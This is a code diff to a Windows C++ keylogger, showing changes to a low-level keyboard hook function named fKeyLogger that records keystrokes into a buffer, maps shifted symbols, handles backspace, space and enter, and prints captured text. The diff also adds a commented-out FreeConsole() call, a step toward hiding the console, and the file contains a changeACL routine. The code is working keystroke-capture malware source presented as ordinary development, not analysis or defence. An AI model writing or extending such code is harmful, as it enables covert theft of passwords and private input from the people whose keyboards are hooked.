@@ -2,7 +2,7 @@
 #include <Windows.h>
 #include <AclApi.h>
 #include <iostream>
-#include <unordered_map>
+#include <map>
 ///------------------------MACROS-------------------
 #define mInfo(msg) wprintf(L"[i] %s\n",msg)
 #define mErrorFunction(function,status) wprintf(L"[-] Error: %s returned status/last error %d\n",function,status)
@@ -119,11 +119,11 @@ BOOL changeACL(void)
 /// Predefined values:
 #define BACKSPACE 8
 #define ENTER 13
+#define SPACE 32
 
+std::wstring buffer;
 
-std::string buffer;
-
-static std::unordered_map<CHAR, CHAR> symbols = {
+static std::map<CHAR, CHAR> symbols = {
 		{'1', '!'}, {'2', '@'}, {'3', '#'}, {'4', '$'}, {'5', '%'},
 		{'6', '^'}, {'7', '&'}, {'8', '*'}, {'9', '('}, {'0', ')'},
 		{'-', '_'}, {'=', '+'}, {'[', '{'}, {']', '}'},
@@ -139,7 +139,7 @@ LRESULT CALLBACK fKeyLogger(int nCode, WPARAM wParam, LPARAM lParam)
 
 		BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
 		BOOL capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-		CHAR symbol = (CHAR)p->vkCode;
+		WCHAR symbol = (WCHAR)p->vkCode;
 		switch (symbol)
 		{
 		case BACKSPACE:
@@ -148,8 +148,11 @@ LRESULT CALLBACK fKeyLogger(int nCode, WPARAM wParam, LPARAM lParam)
 				buffer.pop_back();
 			}
 			break;
+		case SPACE:
+			buffer.push_back(' ');
+			break;
 		case ENTER:
-			std::cout << buffer << "\n";
+			std::wcout << buffer << "\n";
 			buffer.clear();
 			break;
 		default:
@@ -227,7 +230,7 @@ int main(void)
 	}
 
 	mInfo(L"Hook has been set");
-
+	//FreeConsole();
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
